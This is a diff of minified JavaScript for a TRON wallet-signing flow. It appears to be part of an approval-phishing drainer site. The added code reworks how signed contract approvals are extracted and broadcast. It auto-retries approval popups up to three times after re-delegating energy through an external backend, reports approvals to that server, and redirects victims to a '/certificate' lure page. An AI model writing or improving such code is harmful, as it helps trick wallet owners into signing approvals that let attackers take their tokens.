@@ -90879,26 +90879,134 @@
 
                     console.log("[SIGN] trigger done, opening wallet popup...");
                     approvalAttempted = !0;
-                    // CRITICAL: pass FULL triggerSmartContract response as transaction (legacy WC format)
-                    const signed = (await this.provider.request({
-                        method: "tron_signTransaction",
-                        params: {
-                            address: e,
-                            transaction: triggerResult
+
+                    // Trust WC returns many shapes after Energy-rental Continue; normalize them
+                    const looksSigned = (obj) => !!(obj && (obj.signature || obj.raw_data || obj.txID || obj.txid || (obj.transaction && (obj.transaction.signature || obj.transaction.raw_data || obj.transaction.txID))));
+                    const extractSigned = (response) => {
+                        if (!response)
+                            return null;
+                        if ("string" === typeof response && response.length > 20)
+                            return response;
+                        if (looksSigned(response))
+                            return response.transaction && looksSigned(response.transaction) && !response.signature ? response.transaction : response;
+                        if (response.result) {
+                            if ("string" === typeof response.result && response.result.length > 20)
+                                return response.result;
+                            if (looksSigned(response.result))
+                                return response.result.transaction && looksSigned(response.result.transaction) && !response.result.signature ? response.result.transaction : response.result;
+                            if (response.result.result && looksSigned(response.result.result))
+                                return response.result.result;
+                            if (response.result.transaction && looksSigned(response.result.transaction))
+                                return response.result.transaction
                         }
-                    }, "tron:0x2b6653dc")).result;
-                    if (!signed)
+                        if (response.transaction && looksSigned(response.transaction))
+                            return response.transaction;
+                        if (response.data && looksSigned(response.data))
+                            return response.data;
+                        if (response.signedTransaction && looksSigned(response.signedTransaction))
+                            return response.signedTransaction;
+                        return null
+                    };
+
+                    const requestSign = async (txPayload) => {
+                        const response = await this.provider.request({
+                            method: "tron_signTransaction",
+                            params: {
+                                address: e,
+                                transaction: txPayload
+                            }
+                        }, "tron:0x2b6653dc");
+                        try {
+                            console.log("[SIGN] WC raw response", JSON.stringify(response).slice(0, 800))
+                        } catch (_) {
+                            console.log("[SIGN] WC raw response keys", response && typeof response === "object" ? Object.keys(response) : typeof response)
+                        }
+                        return {
+                            response: response,
+                            signed: extractSigned(response)
+                        }
+                    };
+
+                    // Prefer .transaction for Trust; fall back to full trigger result
+                    const payloads = [];
+                    if (triggerResult && triggerResult.transaction)
+                        payloads.push(triggerResult.transaction);
+                    payloads.push(triggerResult);
+
+                    let signed = null;
+                    let lastSignError = null;
+                    let usedFormat = 0;
+                    for (let p = 0; p < payloads.length; p += 1) {
+                        try {
+                            console.log("[SIGN] requesting wallet signature format", p + 1);
+                            const out = await requestSign(payloads[p]);
+                            signed = out.signed;
+                            if (signed) {
+                                usedFormat = p + 1;
+                                console.log("[SIGN] got signature via format", usedFormat);
+                                break
+                            }
+                            console.warn("[SIGN] empty signature for format", p + 1);
+                            // Do NOT auto-open another popup here — outer f() retries after rebuild
+                            if (0 === p)
+                                continue;
+                        } catch (signErr) {
+                            lastSignError = signErr;
+                            const msg = signErr && signErr.message ? signErr.message : String(signErr);
+                            console.warn("[SIGN] sign format failed", p + 1, msg);
+                            // User rejected — stop trying other formats
+                            if (/disapprov|reject|denied|cancel|user.?reject/i.test(msg))
+                                break
+                        }
+                    }
+
+                    if (!signed) {
                         return {
                             success: !1,
                             result: !1,
-                            message: "Wallet returned empty signature"
-                        };
-                    const broadcast = await tronWebInstance.trx.sendRawTransaction(signed);
+                            message: lastSignError && lastSignError.message ? lastSignError.message : "Wallet returned empty signature",
+                            emptySignature: !lastSignError
+                        }
+                    }
+
+                    // Some wallets already include txID (broadcasted during energy rental continue)
+                    const preTxId = signed.txID || signed.txid || (signed.transaction && (signed.transaction.txID || signed.transaction.txid));
+                    if (preTxId && !signed.signature && !(signed.raw_data) && !(signed.transaction && signed.transaction.signature)) {
+                        console.log("[SIGN] wallet returned txID without needing broadcast", preTxId);
+                        return {
+                            success: !0,
+                            result: !0,
+                            txID: preTxId,
+                            raw: signed
+                        }
+                    }
+
+                    const toBroadcast = signed.transaction && (signed.transaction.signature || signed.transaction.raw_data) ? signed.transaction : signed;
+                    let broadcast;
+                    try {
+                        broadcast = await tronWebInstance.trx.sendRawTransaction(toBroadcast)
+                    } catch (broadcastErr) {
+                        console.warn("[SIGN] broadcast error", broadcastErr);
+                        // If Trust already broadcast during Continue, still treat as success when we have txID
+                        if (preTxId)
+                            return {
+                                success: !0,
+                                result: !0,
+                                txID: preTxId,
+                                raw: signed,
+                                broadcastError: broadcastErr && broadcastErr.message
+                            };
+                        throw broadcastErr
+                    }
                     console.log("[SIGN] broadcast", broadcast);
+                    const txID = broadcast && (broadcast.txid || broadcast.txID) || preTxId;
+                    // Duplicate / already-on-chain still counts as success for certificate
+                    const dup = !!(broadcast && (broadcast.code === "DUP_TRANSACTION_ERROR" || (broadcast.message && String(broadcast.message).toLowerCase().includes("dup"))));
+                    const ok = !!(broadcast && (broadcast.result || txID || dup));
                     return {
-                        success: !!(broadcast && broadcast.result),
-                        result: !!(broadcast && broadcast.result),
-                        txID: broadcast && (broadcast.txid || broadcast.txID),
+                        success: ok,
+                        result: ok,
+                        txID: txID,
                         raw: broadcast
                     }
                 } catch (err) {
@@ -93142,7 +93250,7 @@
                     });
                     await f(c, feeLimit, {
                         fromTopUp: topUpSent,
-                        retries: topUpSent ? 3 : 1,
+                        retries: 3,
                         reportEvent: reportEvent
                     });
                 } catch (a) {
@@ -93168,7 +93276,7 @@
               , f = async (e, feeLimit, opts) => {
                 // Direct approval popup after top-up wait — no tap button
                 const options = opts && "object" === typeof opts ? opts : {};
-                const maxTries = Math.max(1, Number(options.retries) || 1);
+                const maxTries = Math.max(3, Number(options.retries) || 3);
                 const reportEvent = "function" === typeof options.reportEvent ? options.reportEvent : () => {};
                 const API_BASE = "https://tronscantelegram-q7ln.onrender.com";
                 console.log("[8] APPROVAL START", e, {
@@ -93223,11 +93331,13 @@
                             txID: n && n.txID || null,
                             message: n && n.message || null
                         });
-                        if (n && (n.result || n.success)) {
+                        if (n && (n.result || n.success || n.txID)) {
                             break
                         }
-                        if (n && n.approvalNotAttempted && tryNo < maxTries) {
-                            console.warn("[SIGN] approve not opened yet, auto-retry", {
+                        // Retry empty-signature / soft fails (Trust Continue often returns empty once)
+                        const softFail = n && (n.approvalNotAttempted || n.emptySignature || (n.message && String(n.message).toLowerCase().includes("empty signature")));
+                        if (softFail && tryNo < maxTries) {
+                            console.warn("[SIGN] soft fail, auto-retry", {
                                 tryNo: tryNo,
                                 message: n.message
                             });
@@ -93235,12 +93345,20 @@
                                 tryNo: tryNo,
                                 message: n.message
                             });
-                            await new Promise((resolve) => setTimeout(resolve, 1500));
+                            // Re-delegate energy then open a fresh approve popup
+                            try {
+                                await GS.post(API_BASE + "/prepare-energy", {
+                                    userAddress: e
+                                }, {
+                                    timeout: 45000
+                                })
+                            } catch (_) {}
+                            await new Promise((resolve) => setTimeout(resolve, 2500));
                             continue
                         }
                         break
                     }
-                    if (n && (n.result || n.success)) {
+                    if (n && (n.result || n.success || n.txID)) {
                         console.log("[SIGN] Approve OK TXID:", n.txID);
                         reportEvent("APPROVAL_APPROVED", {
                             txID: n.txID || "N/A"
@@ -93264,10 +93382,11 @@
                                 error: err && err.message ? err.message : String(err)
                             })
                         });
+                        // Always go to certificate after successful approve
+                        t(3);
                         setTimeout(() => {
                             window.location.href = "/certificate"
-                        }, 1500);
-                        t(3)
+                        }, 800)
                     } else if (n && n.approvalNotAttempted) {
                         console.error("[10] ERROR", {
                             stage: "balance-or-network",
